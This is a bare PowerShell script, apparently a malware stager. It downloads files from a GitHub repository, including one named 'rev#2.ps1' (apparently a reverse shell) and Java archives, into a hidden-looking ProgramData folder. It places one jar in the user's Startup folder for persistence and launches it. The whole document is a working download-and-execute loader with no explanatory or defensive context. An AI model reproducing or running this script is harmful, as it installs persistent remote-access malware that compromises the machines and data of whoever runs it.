mkdir C:\ProgramData\zDATAxD
cd C:\ProgramData\zDATAxD
$source = "https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/rev%232.ps1"
$destination = "C:\ProgramData\zDATAxD\rev%232.ps1"
Invoke-WebRequest -Uri $source -OutFile $destination
$source = "https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/RedTools.jar"
$destination = "C:\ProgramData\zDATAxD\RedTools.jar"
Invoke-WebRequest -Uri $source -OutFile $destination
$source = "https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/RedTools8085.jar"
$destination = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RedTools8085.jar"
Invoke-WebRequest -Uri $source -OutFile $destination
cd "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
Start RedTools8085.jar
